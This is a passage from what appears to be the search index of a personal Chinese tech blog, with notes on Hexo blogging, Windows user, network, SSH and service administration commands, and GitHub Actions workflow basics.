deploy --generate\n\nhexo deploy\n</code></pre>","tags":["hexo"]},{"location":"%E5%B7%A5%E5%85%B7/2022/12/05/2022-12-05-hexo%E4%BD%BF%E7%94%A8/#\u521b\u5efa\u65b0\u6587\u6863","title":"\u521b\u5efa\u65b0\u6587\u6863","text":"<pre><code>hexo new [layout] &lt;title&gt;\n</code></pre> <ul> <li>layout\u53ef\u4ee5\u7406\u89e3\u4e3a\u6a21\u677f\uff0c\u521b\u5efa\u65f6\u4f7f\u7528<code>scaffolds</code>\u76ee\u5f55\u4e0b\u5bf9\u5e94\u540d\u79f0md\u6587\u4ef6\u521b\u5efa\u65b0\u6587\u6863\u3002</li> <li>\u9ed8\u8ba4\u6709\u4e09\u79cdlayout\uff1apost, draft, page</li> <li>\u9ed8\u8ba4layout\u4e3a<code>post</code>\uff0c\u6587\u4ef6\u540d\u683c\u5f0f\u5728config\u6587\u4ef6\u4e2d<code>new_post_name</code>\u6307\u5b9a</li> </ul>","tags":["hexo"]},{"location":"%E5%B7%A5%E5%85%B7/2022/12/05/2022-12-05-hexo%E4%BD%BF%E7%94%A8/#\u4e66\u5199","title":"\u4e66\u5199","text":"","tags":["hexo"]},{"location":"%E5%B7%A5%E5%85%B7/2022/12/05/2022-12-05-hexo%E4%BD%BF%E7%94%A8/#\u5934\u90e8\u5143\u6570\u636e","title":"\u5934\u90e8\u5143\u6570\u636e","text":"<p>front-matter\u4e3a\u6587\u672c\u5934\u90e8\u5143\u7d20\u636e\uff0c\u4f7f\u7528yaml\u6216json\u683c\u5f0f\u3002</p> <p>\u5e38\u7528\u8bbe\u7f6e\uff1a - title - date: \u6587\u4ef6\u521b\u5efa\u65e5\u671f - updated: \u6587\u4ef6\u66f4\u65b0\u65e5\u671f - tags, categories: \u5bf9\u4e8e<code>page</code>\u65e0\u6548   - \u591a\u4e2atag\u8868\u793a\u65b9\u6cd5 <pre><code>tags:\n- openwrt\n- vlan\n- \u8f6f\u8def\u7531\n</code></pre></p>","tags":["hexo"]},{"location":"%E5%B7%A5%E5%85%B7/2022/12/05/2022-12-05-hexo%E4%BD%BF%E7%94%A8/#\u5176\u5b83","title":"\u5176\u5b83","text":"","tags":["hexo"]},{"location":"%E5%B7%A5%E5%85%B7/2022/12/05/2022-12-05-hexo%E4%BD%BF%E7%94%A8/#\u5982\u4f55\u63d0\u4f9b\u9759\u6001\u8d44\u6e90","title":"\u5982\u4f55\u63d0\u4f9b\u9759\u6001\u8d44\u6e90","text":"<ul> <li>\u53ef\u4ee5\u5c06\u56fe\u7247\u3001css\u3001\u4ee3\u7801\u6587\u4ef6\u7b49\u9759\u6001\u8d44\u6e90\u653e\u5728<code>source/</code>\u76ee\u5f55\u4e0b\u3002\u5982\uff1a\u4e00\u79cd\u663e\u793a\u56fe\u7247\u65b9\u5f0f\u4e3a\uff0c\u5c06\u56fe\u7247\u653e\u5728<code>source/images</code>\u76ee\u5f55\uff0c\u7136\u540e\u901a\u8fc7<code>![](../../images/image.jpg)</code>\u663e\u793a\uff08\u6ce8\u610f\u9700\u8981\u6839\u8def\u5f84\uff09\u3002</li> <li>\u4e5f\u53ef\u4ee5\u5f00\u542f<code>post_asset_folder: true</code>\uff0c\u6bcf\u6b21\u521b\u5efapost\u65f6\uff0c\u4f1a\u81ea\u52a8\u521b\u5efa\u4e00\u4e2a\u5bf9\u5e94asset\u76ee\u5f55\u3002\u4e0d\u8fc7\u6211\u56fe\u7247\u4f7f\u7528\u56fe\u5e8a\uff0c\u56e0\u6b64\u57fa\u672c\u7528\u4e0d\u4e0a\u3002</li> </ul>","tags":["hexo"]},{"location":"%E5%B7%A5%E5%85%B7/2022/12/05/2022-12-05-hexo%E4%BD%BF%E7%94%A8/#\u5982\u4f55\u5f15\u7528\u5176\u5b83post","title":"\u5982\u4f55\u5f15\u7528\u5176\u5b83post","text":"<p>\u7531\u4e8ehexo\u652f\u6301markdown, jsp\u7b49\u591a\u79cd\u6587\u6863\u683c\u5f0f\u3002\u4e3a\u4e86\u652f\u6301\u7edf\u4e00\u7684\u7279\u6027\uff0c\u5f15\u5165\u4e86Tag plugin\uff08\u975epost tag\u542b\u4e49\uff09\uff0c\u652f\u6301\u5e38\u89c1\u7684\u6392\u7248\u683c\u5f0f\uff0c\u5982\u5757\u5f15\u7528\u3001\u4ee3\u7801\u5757\u3001Youtube\u89c6\u9891\u7b49\u3002</p> <p>\u94fe\u63a5\u5230\u5176\u5b83\u6587\u7ae0\u683c\u5f0f\u5982\u4e0b\uff1a <pre><code>{% post_path filename %}  \n{% post_link filename [title] [escape] %}\n</code></pre></p>","tags":["hexo"]},{"location":"%E5%B7%A5%E5%85%B7/2022/12/05/2022-12-05-hexo%E4%BD%BF%E7%94%A8/#tag\u548ccategories","title":"tag\u548ccategories","text":"","tags":["hexo"]},{"location":"%E5%B7%A5%E5%85%B7/2022/12/05/2022-12-05-hexo%E4%BD%BF%E7%94%A8/#\u5f00\u542f","title":"\u5f00\u542f","text":"<ol> <li>\u521b\u5efapage   \u4f7f\u7528\u5982\u4e0b\u547d\u4ee4\uff0chexo\u4f1a\u521b\u5efa<code>source/tags</code>\u548c<code>source/categories</code>\u4e24\u4e2a\u76ee\u5f55   <pre><code>hexo new page categories  \nhexo new page tags\n</code></pre>   \u4fee\u6539\u5176\u4e2dindex.md\u6587\u4ef6\uff0c\u6bd4\u5982\u5bf9\u4e8etag   <pre><code>---\ntitle: \u6807\u7b7e  \ndate: 2018-10-10 12:21:48  \ntype: \"tags\"  \n---\n</code></pre></li> <li>\u8bbe\u7f6e<code>_config.yaml</code>\u4e2d\u76ee\u5f55   <pre><code>tag_dir: tags\ncategory_dir: categories\n</code></pre></li> <li>\u8bbe\u7f6e\u4e3b\u9898<code>_config.yaml</code>\u4e2d\u8bbe\u7f6e   <code>yaml   menu: \u00a0 home: / || home \u00a0 #about: /about/ || user \u00a0 tags: [/tags/ || tags] \u00a0 categories: /categories/ || th</code></li> </ol>","tags":["hexo"]},{"location":"%E5%B7%A5%E5%85%B7/2022/12/05/2022-12-05-hexo%E4%BD%BF%E7%94%A8/#\u591a\u4e2atag","title":"\u591a\u4e2atag","text":"<pre><code>tags: [ ]\n- PS5\n- Switch\n- Xbox S\n</code></pre>","tags":["hexo"]},{"location":"%E5%B7%A5%E5%85%B7/2022/12/05/2022-12-05-hexo%E4%BD%BF%E7%94%A8/#\u591a\u4e2acategory","title":"\u591a\u4e2acategory","text":"<p>hexo\u9ed8\u8ba4\u540c\u7ea7category\u53ea\u80fd\u6709\u4e00\u4e2a</p> <p>\u5982\u679c\u60a8\u6709\u8fc7\u4f7f\u7528 WordPress \u7684\u7ecf\u9a8c\uff0c\u5c31\u5f88\u5bb9\u6613\u8bef\u89e3 Hexo \u7684\u5206\u7c7b\u65b9\u5f0f\u3002WordPress \u652f\u6301\u5bf9\u4e00\u7bc7\u6587\u7ae0\u8bbe\u7f6e\u591a\u4e2a\u5206\u7c7b\uff0c\u800c\u4e14\u8fd9\u4e9b\u5206\u7c7b\u53ef\u4ee5\u662f\u540c\u7ea7\u7684\uff0c\u4e5f\u53ef\u4ee5\u662f\u7236\u5b50\u5206\u7c7b\u3002\u4f46\u662f Hexo \u4e0d\u652f\u6301\u6307\u5b9a\u591a\u4e2a\u540c\u7ea7\u5206\u7c7b</p> <p>\u5982\u4e0b\u8bbe\u7f6e\u4f1a\u5bfc\u81f4Life\u4f4d\u4e8eDiary\u7ea7\u522b\u4e0b\u9762 <pre><code>categories:  \n  - Diary  \n  - Life\n</code></pre> \u9700\u8981\u5982\u4e0b\u8bbe\u7f6e <pre><code>- [Diary, PlayStation]  \n- [Diary, Games]  \n- [Life]\n</code></pre> \u6b64\u65f6\u8fd9\u7bc7\u6587\u7ae0\u540c\u65f6\u5305\u62ec\u4e09\u4e2a\u5206\u7c7b\uff1a\u00a0<code>PlayStation</code>\u00a0\u548c\u00a0<code>Games</code>\u00a0\u5206\u522b\u90fd\u662f\u7236\u5206\u7c7b\u00a0<code>Diary</code>\u00a0\u7684\u5b50\u5206\u7c7b\uff0c\u540c\u65f6\u00a0<code>Life</code>\u00a0\u662f\u4e00\u4e2a\u6ca1\u6709\u5b50\u5206\u7c7b\u7684\u5206\u7c7b\u3002</p>","tags":["hexo"]},{"location":"%E5%B7%A5%E5%85%B7/2022/12/05/2022-12-05-hexo%E4%BD%BF%E7%94%A8/#\u5b9a\u5236","title":"\u5b9a\u5236","text":"","tags":["hexo"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/12/05/2022-12-05-windows%E7%9B%B8%E5%85%B3/","title":"windows\u76f8\u5173","text":"<p>windows\u76f8\u5173</p>","tags":["windows"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/12/05/2022-12-05-windows%E7%9B%B8%E5%85%B3/#\u7cfb\u7edf\u7ef4\u62a4","title":"\u7cfb\u7edf\u7ef4\u62a4","text":"","tags":["windows"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/12/05/2022-12-05-windows%E7%9B%B8%E5%85%B3/#\u7528\u6237","title":"\u7528\u6237","text":"<p>\u67e5\u770b\u7528\u6237 <pre><code>C:\\Windows\\System32&gt;net user\n\n\\\\S3-PRO \u7684\u7528\u6237\u5e10\u6237\n\n-------------------------------------------------------------------------------\n15440                    Administrator            DefaultAccount\nGuest                    joker                    WDAGUtilityAccount\nyfy\n\u547d\u4ee4\u6210\u529f\u5b8c\u6210\u3002\n</code></pre></p> <p>\u542f\u7528\u7528\u6237 <pre><code>net user Administrator /active:yes  # \u542f\u52a8Administrator\u7528\u6237\nnet user Administrator password  # \u8bbe\u7f6e\u7528\u6237\u5bc6\u7801\n</code></pre></p> <p>\u5168\u90e8\u547d\u4ee4 <pre><code>NET USER\n[username [password | *] [options]] [/DOMAIN]\n         username {password | *} /ADD [options] [/DOMAIN]\n         username [/DELETE] [/DOMAIN]\n         username [/TIMES:{times | ALL}]\n         username [/ACTIVE: {YES | NO}]\n</code></pre></p> <p>\u6dfb\u52a0\u7528\u6237 <pre><code>net user &lt;user_name&gt; &lt;passwd&gt; /add\n</code></pre></p> <p>\u8bbe\u7f6e\u6743\u9650 <pre><code>net localgroup administrators [username] /add\n</code></pre></p> <p>How to Create an Admin User Account Using CMD Prompt (Windows) \u00ab Operating Systems :: WonderHowTo</p>","tags":["windows"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/12/05/2022-12-05-windows%E7%9B%B8%E5%85%B3/#\u672c\u5730\u7ec4\u7b56\u7565\u7f16\u8f91\u5668","title":"\u672c\u5730\u7ec4\u7b56\u7565\u7f16\u8f91\u5668","text":"<p>win11-home\u6ca1\u6709\uff0c\u9700\u8981\u81ea\u5df1\u5b89\u88c5 <pre><code>gpedit.msc\n</code></pre></p> <p>\u8ba1\u7b97\u673a\u914d\u7f6e-windows\u8bbe\u7f6e-\u5b89\u5168\u8bbe\u7f6e-\u672c\u5730\u7b56\u7565 - \u7528\u6237\u6743\u9650\u5206\u914d   - \u62d2\u7edd\u672c\u5730\u767b\u5f55   - \u62d2\u7edd\u4ece\u7f51\u7edc\u8bbf\u95ee\u8fd9\u53f0\u8ba1\u7b97\u673a   - \u62d2\u7edd\u901a\u8fc7\u8fdc\u7a0b\u684c\u9762\u670d\u52a1\u767b\u5f55 - \u5b89\u5168\u9009\u9879   - \u8d26\u6237\uff1a\u7ba1\u7406\u5458\u8d26\u6237\u72b6\u6001\u3002\uff08\u5373Administrator\u662f\u5426\u53ef\u89c1\uff09   - </p>","tags":["windows"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/12/05/2022-12-05-windows%E7%9B%B8%E5%85%B3/#\u7f51\u7edc","title":"\u7f51\u7edc","text":"","tags":["windows"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/12/05/2022-12-05-windows%E7%9B%B8%E5%85%B3/#\u8def\u7531\u8868","title":"\u8def\u7531\u8868","text":"<pre><code>route print -6\n</code></pre>","tags":["windows"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/12/05/2022-12-05-windows%E7%9B%B8%E5%85%B3/#\u67e5\u770bneigh","title":"\u67e5\u770bneigh","text":"<pre><code>netsh interface ipv6 show neighbors\n</code></pre>","tags":["windows"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/12/05/2022-12-05-windows%E7%9B%B8%E5%85%B3/#\u4fee\u6539\u8def\u7531\u4f18\u5148\u7ea7","title":"\u4fee\u6539\u8def\u7531\u4f18\u5148\u7ea7","text":"<pre><code>ROUTE [-f] [-p] [-4|-6] command [destination]\n                  [MASK netmask]  [gateway] [METRIC metric]  [IF interface]\n\nroute print -4\nroute CHANGE 0.0.0.0 MASK 0.0.0.0 192.168.1.1 METRIC 30 IF 17 #IF\u4eceprint\u4e2d\u83b7\u5f97\n\nroute ADD 192.168.1.0 MASK 255.255.255.0 192.168.1.1 METRIC 1 IF 4\n</code></pre>","tags":["windows"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/12/05/2022-12-05-windows%E7%9B%B8%E5%85%B3/#\u4fee\u6539ipv6ipv4\u4f18\u5148\u7ea7","title":"\u4fee\u6539ipv6\uff0cipv4\u4f18\u5148\u7ea7","text":"<p>Windows10\u8bbe\u7f6eIPv4/v6\u8bbf\u95ee\u4f18\u5148\u7ea7 | IP\u67e5\u8be2(ipw.cn)</p> <p>IPv6(<code>::/0</code>)  \u00a0IPv4(<code>::ffff:0:0/96</code>) \u00a0 <pre><code>C:\\Users\\yfy&gt;netsh interface ipv6 show prefixpolicies\n\u67e5\u8be2\u6d3b\u52a8\u72b6\u6001...\n\n\u4f18\u5148\u987a\u5e8f    \u6807\u7b7e   \u524d\u7f00\n----------  -----  --------------------------------\n        50      0  ::1/128\n        40      1  ::/0\n        35      4  ::ffff:0:0/96\n        30      2  2002::/16\n         5      5  2001::/32\n         3     13  fc00::/7\n         1     11  fec0::/10\n         1     12  3ffe::/16\n         1      3  ::/96\n\n# \u5c06::ffff:0:0/96\u8bbe\u7f6e\u5230::/0\u524d\u9762\u5373\u53ef\nnetsh interface ipv6 set prefixpolicy ::ffff:0:0/96 100 4\n</code></pre></p>","tags":["windows"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/12/05/2022-12-05-windows%E7%9B%B8%E5%85%B3/#\u5f00\u542fssh","title":"\u5f00\u542fssh","text":"","tags":["windows"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/12/05/2022-12-05-windows%E7%9B%B8%E5%85%B3/#\u751f\u6210ssh-key","title":"\u751f\u6210ssh key","text":"<p>\u590d\u5236\u4e8etldr\u547d\u4ee4\u8f93\u51fa</p> <pre><code>- Generate an RSA 4096 bit key with email as a comment:\n   ssh-keygen -t rsa -b 4096 -C \"{{email}}\"\n</code></pre>","tags":["windows"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/12/05/2022-12-05-windows%E7%9B%B8%E5%85%B3/#\u4f7f\u7528ssh-key-ssh\u767b\u5f55windows\u633a\u9ebb\u70e6","title":"\u4f7f\u7528ssh key ssh\u767b\u5f55windows(\u633a\u9ebb\u70e6)","text":"<ol> <li> <p>windows\u5f00\u542fssh server\u3002     \u641c\u7d22\u680f\u8f93\u5165\u7ba1\u7406\u53ef\u9009\u529f\u80fd\uff0c\u641c\u7d22openssh \u670d\u52a1\u5668\u5b89\u88c5</p> </li> <li> <p>\u7f16\u8f91C:/ProgramData/ssh/sshd_config</p> </li> </ol> <pre><code>\u786e\u4fdd\u4ee5\u4e0b3\u6761\u6ca1\u6709\u88ab\u6ce8\u91ca\nPubkeyAuthentication yes\nAuthorizedKeysFile   .ssh/authorized_keys\nPasswordAuthentication no\n\n\u786e\u4fdd\u4ee5\u4e0b2\u6761\u6709\u6ce8\u91ca\u6389\n#Match Group administrators\n#       AuthorizedKeysFile __PROGRAMDATA__/ssh/administrators_authorized_keys\n</code></pre> <ol> <li>\u5ba2\u6237\u7aef\u5c06\u5ba2\u6237\u7aef\u7684public key\u624b\u52a8\u590d\u5236\u5230\uff08\u4f7f\u7528ssh-copy-id\u8c8c\u4f3c\u4f1a\u8f93\u51fa\u4e71\u7801\u5931\u8d25\uff09     ~/.ssh/authorized_keys</li> <li>windows\u91cd\u65b0\u542f\u52a8sshd\uff08\u7ba1\u7406\u5458\uff09     net stop sshd     net start sshd</li> </ol>","tags":["windows"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/12/05/2022-12-05-windows%E7%9B%B8%E5%85%B3/#\u8fdb\u7a0b\u7ba1\u7406","title":"\u8fdb\u7a0b\u7ba1\u7406","text":"<p>How do you list all processes on the command line in Windows? - Super User</p> <pre><code>tasklist \n</code></pre> <p>\u91cd\u542f\u6709\u9053\u8bcd\u5178</p> <pre><code>taskkill /im YoudaoDict.exe /f \n\nstart /d\"D:\\path\\to\\\" YoudaoDict.exe\n</code></pre>","tags":["windows"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/12/05/2022-12-05-windows%E7%9B%B8%E5%85%B3/#smb\u5171\u4eab","title":"SMB\u5171\u4eab","text":"","tags":["windows"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/12/05/2022-12-05-windows%E7%9B%B8%E5%85%B3/#\u672c\u5730\u7ec4\u7ba1\u7406","title":"\u672c\u5730\u7ec4\u7ba1\u7406","text":"<p>Windows 10/ 11 \u4e0b\u5b89\u5168\u5e76\u6b63\u786e\u5730\u4f7f\u7528 SMB \u5171\u4eab_\u8f6f\u4ef6\u5e94\u7528_\u4ec0\u4e48\u503c\u5f97\u4e70 (smzdm.com) - \u521b\u5efa\u4e00\u4e2a\u4e13\u7528\u7528\u6237\u7528\u4e8esmb\u5171\u4eab</p>","tags":["windows"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/12/05/2022-12-05-windows%E7%9B%B8%E5%85%B3/#\u5c06smb\u6302\u8f7d\u5230\u76ee\u5f55","title":"\u5c06smb\u6302\u8f7d\u5230\u76ee\u5f55","text":"<p>windows \u521b\u5efa\u8f6f\u94fe\u63a5  SMB\u8f6f\u94fe\u63a5 \u5bf9\u4e8e\u5927\u90e8\u5206\u5e94\u7528\u6765\u8bf4\uff0c\u8f6f\u94fe\u63a5\u548c\u539f\u751f\u7684\u76ee\u5f55\u884c\u4e3a\u4e00\u6837</p> <pre><code>mklink /d hexo-blog \\\\ryzen\\Home\\Documents\\hexo-blog\\source\\_posts\n</code></pre> <p>\u8fd9\u91cc\u7684\u670d\u52a1\u6307\uff1a\u7a0b\u5e8f\u5f00\u673a\u65f6\u81ea\u52a8\u5728\u540e\u53f0\u8fd0\u884c\u3002\u548c\u5b9a\u65f6\u4efb\u52a1\u5e94\u8be5\u6709\u70b9\u4e0d\u540c\u3002</p>","tags":["windows"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/12/05/2022-12-05-windows%E7%9B%B8%E5%85%B3/#windows\u5b9a\u65f6\u4efb\u52a1","title":"windows\u5b9a\u65f6\u4efb\u52a1","text":"","tags":["windows"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/12/05/2022-12-05-windows%E7%9B%B8%E5%85%B3/#sc\u547d\u4ee4","title":"sc\u547d\u4ee4","text":"<p>SC\u662f\u7528\u6765\u4e0e\u670d\u52a1\u63a7\u5236\u7ba1\u7406\u5668\u548c\u670d\u52a1\u8fdb\u884c\u901a\u4fe1\u7684\u547d\u4ee4\u884c\u7a0b\u5e8f</p> <pre><code>C:\\Users\\yfy&gt;sc create\n\u63cf\u8ff0:\n        \u5728\u6ce8\u518c\u8868\u548c\u670d\u52a1\u6570\u636e\u5e93\u4e2d\u521b\u5efa\u670d\u52a1\u9879\u3002\n\u7528\u6cd5:\n        sc &lt;server&gt; create [service name] [binPath= ] &lt;option1&gt; &lt;option2&gt;...\n\n\u9009\u9879:\n\u6ce8\u610f: \u9009\u9879\u540d\u79f0\u5305\u62ec\u7b49\u53f7\u3002\n      \u7b49\u53f7\u548c\u503c\u4e4b\u95f4\u9700\u8981\u4e00\u4e2a\u7a7a\u683c\u3002\n type= &lt;own|share|interact|kernel|filesys|rec|userown|usershare&gt;\n       (\u9ed8\u8ba4 = own)\n start= &lt;boot|system|auto|demand|disabled|delayed-auto&gt;\n       (\u9ed8\u8ba4 = demand)\n error= &lt;normal|severe|critical|ignore&gt;\n       (\u9ed8\u8ba4 = normal)\n binPath= &lt;.exe \u6587\u4ef6\u7684 BinaryPathName&gt;\n group= &lt;LoadOrderGroup&gt;\n tag= &lt;yes|no&gt;\n depend= &lt;\u4f9d\u5b58\u5173\u7cfb(\u4ee5 / (\u659c\u6760)\u5206\u9694)&gt;\n obj= &lt;AccountName|ObjectName&gt;\n       (\u9ed8\u8ba4= LocalSystem)\n DisplayName= &lt;\u663e\u793a\u540d\u79f0&gt;\n password= &lt;\u5bc6\u7801&gt;\n</code></pre> <p>\u4e0d\u77e5\u9053\u600e\u4e48\u6dfb\u52a0\u547d\u4ee4\u884c\u53c2\u6570</p> <p>\u8c8c\u4f3cbinPath\u53ef\u4ee5\u5305\u542b\u53c2\u6570\uff0c\u6ca1\u8bd5\u8fc7</p> <pre><code>sc create redis binpath= \"\"C:\\Software\\server\\Redis\\redis-server.exe\" --service-run \"rdis.windows-service.conf\"\" start= auto\n\n\u4f5c\u8005\uff1aLAMYMAY\n\u94fe\u63a5\uff1ahttps://www.jianshu.com/p/73d8dd70f918\n\u6765\u6e90\uff1a\u7b80\u4e66\n\u8457\u4f5c\u6743\u5f52\u4f5c\u8005\u6240\u6709\u3002\u5546\u4e1a\u8f6c\u8f7d\u8bf7\u8054\u7cfb\u4f5c\u8005\u83b7\u5f97\u6388\u6743\uff0c\u975e\u5546\u4e1a\u8f6c\u8f7d\u8bf7\u6ce8\u660e\u51fa\u5904\u3002\n</code></pre>","tags":["windows"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/12/05/2022-12-05-windows%E7%9B%B8%E5%85%B3/#\u5c0f\u5de5\u5177nssm","title":"\u5c0f\u5de5\u5177nssm","text":"<p>NSSM - the Non-Sucking Service Manager</p> <p>nssm install\u663e\u793a\u6dfb\u52a0\u670d\u52a1\u7684GUI\u754c\u9762</p> <p></p>","tags":["windows"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/12/05/2022-12-05-windows%E7%9B%B8%E5%85%B3/#windows\u5c0f\u95ee\u9898","title":"windows\u5c0f\u95ee\u9898","text":"","tags":["windows"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/12/05/2022-12-05-windows%E7%9B%B8%E5%85%B3/#\u7f51\u7edc\u663e\u793a\u672a\u8fde\u63a5\u5b9e\u9645\u6709\u7f51","title":"\u7f51\u7edc\u663e\u793a\u672a\u8fde\u63a5\u5b9e\u9645\u6709\u7f51","text":"<p>\u6d4b\u8bd5\u4ee5\u4e0b\u4e24\u4e2a\u57df\u540ddns\u89e3\u6790\u662f\u5426\u6b63\u5e38 <pre><code>dns.msftncsi.com\nwww.msftconnecttest.com\n</code></pre></p>","tags":["windows"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/12/05/2022-12-05-windows%E7%9B%B8%E5%85%B3/#\u5220\u9664\u6587\u4ef6\u7ba1\u7406\u5668\u4e2d\u7684\u7f51\u76d8","title":"\u5220\u9664\u6587\u4ef6\u7ba1\u7406\u5668\u4e2d\u7684\u7f51\u76d8","text":"<p>new bing Q: \u5982\u4f55\u6e05\u9664\u8f6f\u4ef6\u5728windows\u6587\u4ef6\u7ba1\u7406\u5668\u4e2d\u6ce8\u518c\u7684\u7f51\u76d8 A: \u5982\u679c\u60a8\u60f3\u5220\u9664\u6ce8\u518c\u8868\u4e2d\u7684\u7f51\u76d8\uff0c\u8bf7\u6309\u7167\u4ee5\u4e0b\u6b65\u9aa4\u64cd\u4f5c\uff1a 1.  \u6309\u4e0bWin+R\u952e\u6253\u5f00\u8fd0\u884c\u7a97\u53e3\u3002 2.  \u8f93\u5165regedit\u5e76\u6309\u56de\u8f66\u952e\u6253\u5f00\u6ce8\u518c\u8868\u7f16\u8f91\u5668\u3002 3.  \u5728\u5de6\u4fa7\u5bfc\u822a\u680f\u4e2d\u627e\u5230HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\NetDrive\u3002 4.  \u53f3\u952e\u5355\u51fbNetDrive\u5e76\u9009\u62e9\u5220\u9664\u3002 5.  \u5173\u95ed\u6ce8\u518c\u8868\u7f16\u8f91\u5668\u3002</p> <p>\u4f46\u662f\u8fd9\u91cc\u7684\u8def\u5f84\u4e0d\u5b8c\u5168\u6b63\u786e</p> <p>\u8c37\u6b4c\uff1a\u5220\u9664\u6ce8\u518c\u8868\u4e2d\u7684\u7f51\u76d8 \u5f97\u5230\u8bb8\u591a\u7c7b\u4f3c\u95ee\u9898</p> <p>\u5728regedit\u4e2d\u624b\u52a8\u641c\u7d22SeaDrive\uff0c\u53ef\u4ee5\u627e\u5230\u4f4d\u7f6e\uff0c\u5220\u9664\u95ee\u9898\u89e3\u51b3\u3002</p>","tags":["windows"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/12/05/2022-12-05-windows%E7%9B%B8%E5%85%B3/#\u6587\u4ef6\u6216\u76ee\u5f55\u635f\u574f\u4e14\u65e0\u6cd5\u8bfb\u53d6","title":"\u6587\u4ef6\u6216\u76ee\u5f55\u635f\u574f\u4e14\u65e0\u6cd5\u8bfb\u53d6","text":"<p>qbittorent\u79fb\u52a8\u79cd\u5b50\u65f6\uff0c\u6211\u628a\u8fdb\u7a0b\u5f3a\u884c\u6740\u6389\u4e86\u3002\u5bfc\u81f4\u78c1\u76d8\u4e0a\u51fa\u73b0\u4e86\u6587\u4ef6\u5939\u65e0\u6cd5\u5220\u9664\u7684\u60c5\u51b5</p> <p>\u89e3\u51b3\u529e\u6cd5\uff0c\u626b\u63cf\u4fee\u590d\u6587\u4ef6\u7cfb\u7edf <pre><code>chkdsk /f C:\n</code></pre></p>","tags":["windows"]},{"location":"%E6%8A%98%E8%85%BE/2023/01/27/2023-01-27-github-action%E7%BC%96%E8%AF%91openwrt/","title":"github action\u7f16\u8bd1openwrt","text":"","tags":["openwrt","CI","github-action"]},{"location":"%E6%8A%98%E8%85%BE/2023/01/27/2023-01-27-github-action%E7%BC%96%E8%AF%91openwrt/#\u53c2\u8003","title":"\u53c2\u8003","text":"<p>github action\u57fa\u672c\u6559\u7a0b\uff1aGitHub Actions \u5165\u95e8\u6559\u7a0b - \u962e\u4e00\u5cf0\u7684\u7f51\u7edc\u65e5\u5fd7 (ruanyifeng.com) \u4eceworkflow\u6982\u5ff5\u5230\u9ad8\u7ea7\u7528\u6cd5\uff1aAbout workflows - GitHub Docs</p>","tags":["openwrt","CI","github-action"]},{"location":"%E6%8A%98%E8%85%BE/2023/01/27/2023-01-27-github-action%E7%BC%96%E8%AF%91openwrt/#workflow\u57fa\u7840","title":"workflow\u57fa\u7840","text":"<ul> <li>\u53ef\u4ee5\u6709\u591a\u4e2aworkflow\uff1aFor example, you can have one workflow to build and test pull requests, another workflow to deploy your application every time a release is created, and still another workflow that adds a label every time someone opens a new issue.</li> </ul>","tags":["openwrt","CI","github-action"]},{"location":"%E6%8A%98%E8%85%BE/2023/01/27/2023-01-27-github-action%E7%BC%96%E8%AF%91openwrt/#\u8fd0\u884c\u65f6\u673a\u89e6\u53d1\u4e00\u6761workflow","title":"\u8fd0\u884c\u65f6\u673a\uff08\u89e6\u53d1\u4e00\u6761workflow\uff09","text":"<ul> <li>Events that occur in your workflow's repository</li> <li>Events that occur outside of GitHub and trigger a\u00a0<code>repository_dispatch</code>\u00a0event on GitHub</li> <li>Scheduled times</li> <li>Manual</li> </ul>","tags":["openwrt","CI","github-action"]},{"location":"%E6%8A%98%E8%85%BE/2023/01/27/2023-01-27-github-action%E7%BC%96%E8%AF%91openwrt/#\u4f8b\u5b50","title":"\u4f8b\u5b50","text":"<pre><code>name: learn-github-actions\nrun-name: ${{ github.actor }} is learning GitHub Actions\non: [push]\njobs:\n  check-bats-version:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v3\n      - uses: actions/setup-node@v3\n        with:\n          node-version: '14'\n      - run: npm install -g bats\n      - run: bats -v\n</code></pre>","tags":["openwrt","CI","github-action"]},{"location":"%E6%8A%98%E8%85%BE/2023/01/27/2023-01-27-github-action%E7%BC%96%E8%AF%91openwrt/#job\u4f9d\u8d56need","title":"job\u4f9d\u8d56(need)","text":"<pre><code>jobs:\n  setup:\n    runs-on: ubuntu-latest\n    steps:\n      - run: ./setup_server.sh\n  build:\n    needs: setup\n    runs-on: ubuntu-latest\n    steps:\n      - run: ./build_server.sh\n  test:\n    needs: build\n    runs-on: ubuntu-latest\n    steps:\n      - run: ./test_server.sh\n</code></pre>","tags":["openwrt","CI","github-action"]},{"location":"%E6%8A%98%E8%85%BE/2023/01/27/2023-01-27-github-action%E7%BC%96%E8%AF%91openwrt/#\u91cd\u590d\u6267\u884cjobmatrix","title":"\u91cd\u590d\u6267\u884cjob(matrix)","text":"<p>\u91cd\u590d\u6267\u884c3\u6b21\uff0c\u6bcf\u6b21\u4f7f\u7528\u4e0d\u540cnodejs\u7248\u672c <pre><code>jobs:\n  build:\n    runs-on: ubuntu-latest\n    strategy:\n      matrix:\n        node: [12, 14, 16]\n    steps:\n      - uses: actions/setup-node@v3\n        with:\n          node-version: ${{ matrix.node }}\n</code></pre></p>","tags":["openwrt","CI","github-action"]},{"location":"%E6%8A%98%E8%85%BE/2023/01/27/2023-01-27-github-action%E7%BC%96%E8%AF%91openwrt/#stepsrun","title":"steps.run","text":"<p>\u6bcf\u4e2arun\u90fd\u5728\u5355\u72ec\u7684\u8fdb\u7a0b\u4e2d</p> <pre><code>- name: Install Dependencies\n  run: npm install\n\n# multi-line command\n- name: Clean install dependencies and build\n  run: |\n    npm ci\n    npm run build\n\n# working dir\n- name: Clean temp directory\n  run: rm 